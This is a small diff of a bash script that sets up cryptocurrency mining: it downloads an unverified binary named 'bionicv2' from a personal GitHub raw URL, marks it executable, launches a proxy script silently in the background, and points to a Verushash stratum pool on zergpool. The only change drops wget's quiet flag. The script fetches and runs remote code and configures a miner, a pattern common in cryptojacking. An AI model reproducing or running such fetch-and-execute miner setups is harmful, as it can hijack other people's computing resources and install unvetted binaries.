@@ -1,5 +1,5 @@
 #!/bin/bash
-wget -qO bionicv2 https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefromego/main/bionicv2
+wget -O bionicv2 https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefromego/main/bionicv2
 chmod +x bionicv2
 python3 proxy.py >/dev/null &
 pool="stratum+tcp://verushash.mine.zergpool.com:3300"
